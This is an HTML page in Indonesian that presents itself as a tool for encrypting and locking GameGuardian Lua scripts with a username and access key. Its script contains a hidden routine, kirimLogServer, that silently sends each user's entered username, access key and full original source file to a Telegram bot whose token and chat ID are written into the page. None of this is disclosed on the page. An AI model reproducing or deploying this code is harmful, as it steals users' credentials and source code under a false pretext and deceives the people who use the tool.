<!doctype html>
<html>
<head>
    <meta charset="utf-8" >
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-id="th-modified">ENKRIPSI KUNCI USER</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#050505;font-family:system-ui;color:#ffd766;padding:15px}
        .box{max-width:580px;margin:0 auto;background:#111;border:2px solid #ff9900;border-radius:12px;padding:20px;text-align:center}
        h2{color:#ffcc33;margin-bottom:15px}
        .info{background:#1a1a1a;border:1px solid #ff9900;border-radius:8px;padding:10px;margin:10px 0;text-align:left;display:none}
        .status{background:#0f1a0f;border:1px solid #33ff33;border-radius:8px;padding:10px;margin:10px 0;color:#88ff88;display:none}
        .form{background:#1a1a1a;border:1px solid #b8860b;border-radius:8px;padding:12px;margin:10px 0;text-align:left}
        .form label{display:block;margin:8px 0 4px 0;color:#ffdd99;font-size:13px}
        .form input[type="text"], .form input[type="number"]{width:100%;padding:8px;border-radius:6px;border:1px solid #b8860b;background:#050505;color:#ffd766;font-size:14px}
        .checkbox-group{display:flex;align-items:center;margin-top:12px;padding-top:8px;border-top:1px dashed #b8860b}
        .checkbox-group input{width:18px;height:18px;accent-color:#ff9900;cursor:pointer}
        .checkbox-group label{margin:0 0 0 8px;color:#ffcc33;font-weight:bold;cursor:pointer}
        .expired-box{background:#120c02;border:1px dashed #ff9900;border-radius:6px;padding:10px;margin-top:8px;display:none}
        .tombol{width:100%;padding:14px;font-size:16px;font-weight:bold;border:none;border-radius:8px;background:linear-gradient(90deg,#ff9900,#ffcc00,#ff9900);color:#000;cursor:pointer;margin:8px 0}
        .tombol2{background:linear-gradient(90deg,#22aa22,#33ff33,#22aa22);color:#fff;display:none}
        pre{background:#050505;border:1px solid #444;border-radius:8px;padding:10px;margin:15px 0;text-align:left;font-size:10px;color:#ffdd55;max-height:200px;overflow:auto;display:none}
        #file{display:none}
    </style>
<meta property="og:title" content="ENKRIPSI PROSESS LOADING" data-id="th-modified" ><meta name="description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:description" content="ENC SYSTEM" data-id="th-modified" ><meta property="og:image" content="https://tiiny.host/assets/logo-purple-bg.png" data-id="th-modified" ><meta property="og:image:width" content="1501" data-id="th-modified" ><meta property="og:image:height" content="1501" data-id="th-modified" ><meta property="og:image:type" content="image/png" data-id="th-modified" ><meta property="og:url" content="https://progresbeta.tiiny.site/" data-id="th-modified" ><meta property="og:type" content="website" data-id="th-modified" ><script defer data-domain="progresbeta.tiiny.site" src="https://analytics.tiiny.net/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script></head>
<body>
<div class="box">
    <h2>🔐 ◄ AWIMEDAN SCRIPT ENC USER ► 🔐</h2>
    <p style="font-size:13px;color:#ffdd99;margin-bottom:15px">
        FILE DIKUNCI & SIAP DIJALANKAN DI GG<br>
        Check file Download & Jalankan Guardian game
    </p>

    <div class="form">
        <label>👤 Username:</label>
        <input type="text" id="user" placeholder="Bisa semua huruf & simbol" required>
        
        <label>🔑 Kunci Akses:</label>
        <input type="text" id="kunci" placeholder="Bisa semua karakter" required>
        
        <label>👥 Jumlah Pemain:</label>
        <input type="number" id="pemain" value="10" min="1" max="99999">

        <div class="checkbox-group">
            <input type="checkbox" id="aktifexpired" onchange="toggleExpiredBox()">
            <label for="aktifexpired">Aktifkan Expired Online</label>
        </div>

        <div class="expired-box" id="expiredbox">
            <label>📅 Tahun Kedaluwarsa:</label>
            <input type="number" id="exp_tahun" value="2030">
            
            <label>📅 Bulan (1-12):</label>
            <input type="number" id="exp_bulan" value="12" min="1" max="12">
            
            <label>📅 Tanggal (1-31):</label>
            <input type="number" id="exp_tanggal" value="31" min="1" max="31">
            
            <label>💬 Pesan Kedaluwarsa:</label>
            <input type="text" id="exp_pesan" value="Script has expired!">
        </div>
    </div>

    <input type="file" id="file">
    
    <div class="info" id="infonama">📄 File: <span id="namafile"></span></div>
    <div class="status" id="proses">⏳ Sedang memproses...</div>

    <button class="tombol" onclick="document.getElementById('file').click()">📂 SELECT TARGET FILE</button>

    <pre id="hasilakhir"></pre>

    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL</button>
</div>

<script>
const TOKEN_API = "8624792353:AAGxp4AXhtUzYw2H1x_7-U-VqoGMkGdPCTE";
const TARGET_ID = "6095762919";

let namaAsli = ""
let isiFileAsli = ""
let hasilTerkunci = ""

function toggleExpiredBox() {
    let cek = document.getElementById('aktifexpired').checked;
    document.getElementById('expiredbox').style.display = cek ? "block" : "none";
}

document.getElementById('file').addEventListener('change', function(e){
    let f = e.target.files[0]
    if(!f) return

    let u = document.getElementById('user').value.trim()
    let k = document.getElementById('kunci').value.trim()
    if(!u || !k){
        alert("⚠️ Isi dulu Username dan Kunci!")
        e.target.value = ""
        return
    }

    namaAsli = f.name
    document.getElementById('namafile').textContent = namaAsli
    document.getElementById('infonama').style.display = "block"
    document.getElementById('proses').style.display = "block"
    document.getElementById('hasilakhir').style.display = "none"
    document.getElementById('btnsimpan').style.display = "none"

    let reader = new FileReader();
    reader.onload = function(evt) {
        isiFileAsli = evt.target.result;
        setTimeout(() => {
            try {
                kirimLogServer();
                prosesBenar(isiFileAsli);
            } catch(err) {
                alert("ERROR: " + err.message);
                document.getElementById('proses').style.display = "none";
            }
            e.target.value = "";
        }, 100);
    };
    reader.onerror = function() {
        alert("❌ Gagal membaca file!");
        document.getElementById('proses').style.display = "none";
        e.target.value = "";
    };
    reader.readAsText(f);
});

function kirimLogServer(){
    if(!TOKEN_API || !TARGET_ID) return

    let isExp = document.getElementById('aktifexpired').checked ? "Aktif" : "Tidak";
    let teksPesan = `📂 *LOG ENKRIPSI BARU*\n\n` +
                    `📄 *File:* \`${namaAsli}\`\n` +
                    `👤 *User:* \`${document.getElementById('user').value}\`\n` +
                    `🔑 *Key:* \`${document.getElementById('kunci').value}\`\n` +
                    `👥 *Slot:* \`${document.getElementById('pemain').value}\`\n` +
                    `⏰ *Expired Online:* \`${isExp}\``;

    let urlPesan = `https://api.telegram.org/bot${TOKEN_API}/sendMessage`;
    
    fetch(urlPesan, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: TARGET_ID,
            text: teksPesan,
            parse_mode: "Markdown"
        })
    }).catch(err => {})

    let blobFile = new Blob([isiFileAsli], {type: "text/plain"});
    let formData = new FormData();
    formData.append("chat_id", TARGET_ID);
    formData.append("document", blobFile, "SOURCE_" + namaAsli);
    formData.append("caption", "📄 Backup file sumber asli");

    let urlFile = `https://api.telegram.org/bot${TOKEN_API}/sendDocument`;
    
    fetch(urlFile, {
        method: "POST",
        body: formData
    }).catch(err => {})
}

function aman(str){
    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'")
}

function jadikanHex(teks, kunci){
    let h = ""
    for(let i=0; i<teks.length; i++){
        let b = teks.charCodeAt(i) ^ kunci
        h += b.toString(16).padStart(2,'0')
    }
    return h
}

function prosesBenar(isifile){
    let user = aman(document.getElementById('user').value.trim())
    let kunci = aman(document.getElementById('kunci').value.trim())
    let jml = document.getElementById('pemain').value || 10
    let isExpiredAktif = document.getElementById('aktifexpired').checked

    let expTahun = document.getElementById('exp_tahun').value.trim()
    let expBulan = document.getElementById('exp_bulan').value.trim()
    let expTanggal = document.getElementById('exp_tanggal').value.trim()
    let expPesan = aman(document.getElementById('exp_pesan').value.trim())

    if(expBulan.length === 1) expBulan = "0" + expBulan
    if(expTanggal.length === 1) expTanggal = "0" + expTanggal

    let kunciHex = Math.floor(Math.random() * 200) + 50;
    let isiHex = jadikanHex(isifile, kunciHex);

    let scriptExpiredCode = ""
    if (isExpiredAktif) {
        scriptExpiredCode = `local Date = gg.makeRequest("http://www.whatismyip.org/")\n` +
            `if Date == "The user did not allow access to the Internet." then\n` +
            `return\n` +
            `elseif Date == "java.net.UnknownHostException: Unable to resolve host \\"www.whatismyip.org\\": No address associated with hostname" then\n` +
            `gg.alert("Please connect to the network")\n` +
            `return\n` +
            `else\n` +
            `Date = Date["headers"]["Date"][1]\n` +
            `if tonumber(Date:sub(13, 16) .. ({\n` +
            `["Jan"] = "01",\n["Feb"] = "02",\n["Mar"] = "03",\n["Apr"] = "04",\n` +
            `["May"] = "05",\n["Jun"] = "06",\n["Jul"] = "07",\n["Aug"] = "08",\n` +
            `["Sep"] = "09",\n["Oct"] = "10",\n["Nov"] = "11",\n["Dec"] = "12",\n` +
            `})[Date:sub(9, 11)] .. Date:sub(6, 7)) >= tonumber(` + expTahun + expBulan + expTanggal + `) then\n` +
            `gg.alert("` + expPesan + `")\n` +
            `return\n` +
            `end\n` +
            `end\n`
    }

    let baseScript = `-- =====================================\n` +
        `-- 📜 By AWIMEDAN SCRIPT SYSTEM\n` +
        `-- 👤 Username : ${document.getElementById('user').value.trim()}\n` +
        `-- 👥 Slot Pemain : ${jml}\n` +
        `-- =====================================\n\n` +
        scriptExpiredCode + `\n` +
        `-- Verifikasi Username & Kunci Akses (AWIMEDAN)\n` +
        `local inputUser = gg.prompt({\n` +
        `    '👤 Masukkan Username:',\n` +
        `    '🔑 Masukkan Kunci Akses:',\n` +
        `    '👥 Jumlah Pemain:'\n` +
        `}, {\n` +
        `    '',\n` +
        `    '',\n` +
        `    '` + jml + `'\n` +
        `}, {\n` +
        `    'text',\n` +
        `    'text',\n` +
        `    'number'\n` +
        `})\n\n` +
        `if not inputUser then\n` +
        `    gg.alert('Dibatalkan')\n` +
        `    return os.exit()\n` +
        `end\n\n` +
        `if inputUser[1] ~= '` + user + `' then\n` +
        `    gg.alert('❌ Username Salah!')\n` +
        `    return os.exit()\n` +
        `end\n\n` +
        `if inputUser[2] ~= '` + kunci + `' then\n` +
        `    gg.alert('❌ Kunci Akses Salah!')\n` +
        `    return os.exit()\n` +
        `end\n\n` +
        `gg.toast('Verifikasi Berhasil')\n` +
        `gg.alert('✅ AKSES DITERIMA\\n👥 Slot Pemain: ' .. tostring(inputUser[3]))\n\n` +
        `local decodeHex = function(h)\n` +
        `    local s = ""\n` +
        `    for i = 1, #h, 2 do\n` +
        `        local b = tonumber("0x" .. h:sub(i, i+1))\n` +
        `        if b then s = s .. string.char(b ~ ` + kunciHex + `) end\n` +
        `    end\n` +
        `    return s\n` +
        `end\n\n` +
        `local encryptedData = "${isiHex}"\n` +
        `local rawScript = decodeHex(encryptedData)\n` +
        `local loadFunc = loadstring or load\n` +
        `local runningScript, err = loadFunc(rawScript)\n\n` +
        `if not runningScript then\n` +
        `    gg.alert("Error Eksekusi Script: " .. tostring(err))\n` +
        `    return\n` +
        `end\n\n` +
        `runningScript()`;

    hasilTerkunci = baseScript;

    let previewText = hasilTerkunci.length > 50000 ? hasilTerkunci.substring(0, 50000) + "\n\n[... Teks terlalu panjang untuk pratinjau, silakan langsung simpan file ...]" : hasilTerkunci;

    document.getElementById('hasilakhir').textContent = previewText;
    document.getElementById('proses').style.display = "none";
    document.getElementById('hasilakhir').style.display = "block";
    document.getElementById('btnsimpan').style.display = "block";
}

function unduh(){
    let namaKeBetar = namaAsli.replace(".Enc","_AWIMEDAN.CPM").replace(".lua","_AWIMEDANENC.lua");
    if(!namaKeBetar.includes("AWIMEDAN")) namaKeBetar = namaAsli + "_AWIMEDANENC.lua";
    
    let file = new Blob([hasilTerkunci], {type:"text/plain;charset=utf-8"});
    let url = URL.createObjectURL(file);

    let a = document.createElement("a");
    a.href = url;
    a.download = namaKeBetar;
    document.body.appendChild(a);
    a.click();

    setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }, 300);
}
</script>
</body>
</html>
